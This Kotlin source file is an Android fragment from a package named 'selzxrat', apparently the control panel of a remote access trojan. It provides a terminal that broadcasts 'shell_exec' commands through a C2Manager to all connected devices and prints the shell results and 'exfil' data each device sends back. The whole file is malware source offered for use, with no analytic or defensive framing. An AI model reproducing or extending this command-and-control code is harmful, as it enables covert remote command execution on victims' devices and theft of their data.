package com.selzxrat.v5.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.fragment.app.Fragment
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R

class TerminalFragment : Fragment() {

    private lateinit var tvOutput: TextView
    private lateinit var etInput: EditText
    private lateinit var btnSend: Button
    private val output = StringBuilder()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val view = inflater.inflate(R.layout.fragment_terminal, container, false)

        tvOutput = view.findViewById(R.id.tvTerminalOutput)
        etInput = view.findViewById(R.id.etTerminalInput)
        btnSend = view.findViewById(R.id.btnTerminalSend)

        btnSend.setOnClickListener {
            val cmd = etInput.text.toString().trim()
            if (cmd.isEmpty()) return@setOnClickListener
            output.append("> $cmd\n")
            tvOutput.text = output.toString()
            // Send as broadcast
            C2Manager.broadcastCommand("shell_exec", cmd)
            etInput.text.clear()
        }

        C2Manager.onExfilReceived { data ->
            if (data.type == "shell_result" || data.type == "get_info") {
                requireActivity().runOnUiThread {
                    output.append("[${data.deviceId}] ${data.content}\n")
                    tvOutput.text = output.toString()
                }
            }
        }

        return view
    }
}